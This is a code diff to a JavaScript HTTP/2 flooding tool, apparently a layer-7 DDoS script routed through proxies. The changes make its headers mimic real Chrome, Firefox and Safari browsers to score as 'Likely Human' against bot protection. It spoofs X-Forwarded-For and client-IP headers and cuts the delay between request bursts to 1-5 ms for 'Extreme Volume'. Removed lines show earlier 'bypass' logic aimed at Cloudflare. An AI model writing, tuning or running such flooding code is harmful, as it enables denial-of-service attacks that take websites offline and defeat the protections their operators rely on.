@@ -337,51 +337,64 @@ const generateHeaders = (browser) => {
         + '&' + generateRandomString(4)  + '=' + generateRandomString(8,16)
         + '&cb=' + Date.now() + '&session=' + generateRandomString(10);
 
-    return {
+    // Modernized headers with REALISTIC ORDERING for "Likely Human" score
+    const base = {
         ':method':   'GET',
         ':authority': buildAuthority(),
         ':scheme':   'https',
         ':path':     buildPath(),
-        'sec-ch-ua':                   chUA.ua,
-        'sec-ch-ua-mobile':            isMobile ? '?1' : (Math.random()<0.1 ? '?1' : '?0'),
-        'sec-ch-ua-platform':          chUA.plat,
-        'sec-ch-ua-platform-version':  chUA.pver,
-        'sec-ch-ua-full-version-list': chUA.full,
-        'sec-ch-ua-bitness':           '"64"',
-        'sec-ch-ua-model':             isMobile ? `"Pixel ${getRandomInt(6,9)}"` : '""',
-        'sec-ch-ua-arch':              chUA.arch,
-        'user-agent': ua,
-        'accept': Math.random()<0.5
-            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
-            : 'application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'accept-language':  randomElement(["en-US,en;q=0.9","id-ID,id;q=0.9","fr-FR,fr;q=0.8","es-ES,es;q=0.7","de-DE,de;q=0.9","ja-JP,ja;q=0.8","pt-BR,pt;q=0.8","ko-KR,ko;q=0.8"]),
-        'accept-encoding':  randomElement(["gzip, deflate, br","gzip, deflate, zstd, br","gzip, br, zstd","br, gzip"]),
-        'referer': randomElement(refs),
-        'origin':  randomElement(oris),
-        'x-forwarded-for': lip1 + (Math.random()<0.3 ? `, ${lip2}` : ''),
-        'x-real-ip':       lip3,
-        'x-client-ip':     lip4,
-        'forwarded':       `for=${generateLegitIP()};proto=https` + (Math.random()<0.2 ? `;host=${parsedTarget.host}` : ''),
-        'sec-fetch-dest':  'document',
-        'sec-fetch-mode':  'navigate',
-        'sec-fetch-site':  Math.random()<0.6 ? 'same-origin' : 'cross-site',
-        'cache-control':             Math.random()<0.5 ? 'max-age=0' : 'no-cache, no-store, must-revalidate',
-        'upgrade-insecure-requests': Math.random()<0.7 ? '1' : '0',
-        'dnt':                       Math.random()<0.5 ? '1' : '0',
-        'te':          'trailers',
-        'early-data':  '1',
-        'priority':    '"u=0, i"',
-        'ect':         randomElement(['2g','3g','4g','5g']),
-        'rtt':         getRandomInt(50, 550),
-        'downlink':    (Math.random()*10).toFixed(2),
-        'x-device-id':          generateRandomString(32),
-        'x-session-id':         generateRandomString(20),
-        'x-requested-with':     'XMLHttpRequest',
-        'x-webgl-renderer':     'WebKit WebGL',
-        'x-webgl-extensions':   'EXT_texture_filter_anisotropic, EXT_blend_minmax',
-        'x-canvas-fingerprint': generateRandomString(16),
     };
+
+    const browserHeaders = {
+        chrome: {
+            'sec-ch-ua':                   chUA.ua,
+            'sec-ch-ua-mobile':            isMobile ? '?1' : '?0',
+            'sec-ch-ua-platform':          chUA.plat,
+            'user-agent':                  ua,
+            'accept':                      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site':              Math.random() < 0.8 ? 'none' : 'same-origin',
+            'sec-fetch-mode':              'navigate',
+            'sec-fetch-user':              '?1',
+            'sec-fetch-dest':              'document',
+            'accept-encoding':             'gzip, deflate, br, zstd',
+            'accept-language':             'en-US,en;q=0.9,id;q=0.8',
+            'priority':                    'u=0, i',
+        },
+        firefox: {
+            'user-agent':                  ua,
+            'accept':                      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'accept-language':             'en-US,en;q=0.5',
+            'accept-encoding':             'gzip, deflate, br, zstd',
+            'upgrade-insecure-requests':   '1',
+            'sec-fetch-dest':              'document',
+            'sec-fetch-mode':              'navigate',
+            'sec-fetch-site':              'none',
+            'sec-fetch-user':              '?1',
+            'priority':                    'u=1',
+            'te':                          'trailers',
+        },
+        safari: {
+            'user-agent':                  ua,
+            'accept':                      'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'sec-fetch-dest':              'document',
+            'accept-language':             'en-US,en;q=0.9',
+            'sec-fetch-site':              'none',
+            'sec-fetch-mode':              'navigate',
+            'accept-encoding':             'gzip, deflate, br',
+        }
+    };
+
+    const selectedHeaders = browserHeaders[browser] || browserHeaders['chrome'];
+    
+    // Combine in correct order
+    return Object.assign({}, base, selectedHeaders, {
+        'referer': randomElement(refs),
+        'x-request-id': generateRandomString(32),
+        'x-client-ip': lip1,
+        'x-forwarded-for': lip2,
+    });
 };
+
 const browser = getRandomBrowser();
 const headers = generateHeaders(browser);
 let h2_config;
@@ -517,38 +530,24 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 return;
             }
 
-            // Burst parallel requests for "High Request" goal
-            // Multi-packet burst logic: kirim banyak request sekaligus per frame
-            for (let i = 0; i < args.Rate; i++) {
+            // Extreme Volume logic: kirim multiple requests per setImmediate
+            const burstSize = Math.max(1, Math.floor(args.Rate / 10)); 
+            
+            for (let i = 0; i < burstSize; i++) {
                 if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) break;
                 
                 const freshBrowser = getRandomBrowser();
-                const freshHeaders = generateHeaders(freshBrowser);
-                
-                // Bypass logic: acak headers lebih agresif
-                const dynHeaders = shuffleObject({
-                    ...freshHeaders,
-                    ['x-request-id']: randstr(32),
-                    ['x-session-token']: randstr(64),
-                    ['cf-visitor']: randstr(10),
-                    ['sec-fetch-user']: Math.random() < 0.5 ? '?1' : undefined,
-                    ':path': freshHeaders[':path'] + (Math.random() < 0.5 ? `&v=${randstr(8)}` : '')
-                });
+                const dynHeaders = generateHeaders(freshBrowser);
 
                 try {
-                    // Pakai setImmediate biar loop nggak blokir I/O
                     setImmediate(() => {
                         const req = client.request(dynHeaders, {
-                            weight: getRandomInt(200, 256),
+                            weight: freshBrowser === 'chrome' ? 256 : 220,
                             dependsOn: 0,
                             exclusive: true
                         });
                         
-                        req.on('response', (headers) => {
-                            // Jika kena 403 / 429, kurangi rate biar nggak ke-ban proxy-nya
-                            if (headers[':status'] == '403' || headers[':status'] == '429') {
-                                // console.log("Blocked by CF");
-                            }
+                        req.on('response', (res) => {
                             req.close();
                             req.destroy();
                         });
@@ -564,12 +563,12 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 }
             }
 
-            // High RPS cooldown: sesuaikan dengan rate yang diminta
             if (running) {
-                const burstDelay = Math.max(1, Math.floor(1000 / args.Rate));
-                setTimeout(doBurst, burstDelay);
+                // Sempitkan delay (1ms - 5ms) untuk High RPS
+                setTimeout(doBurst, getRandomInt(1, 5));
             }
         };
+
 
 
 
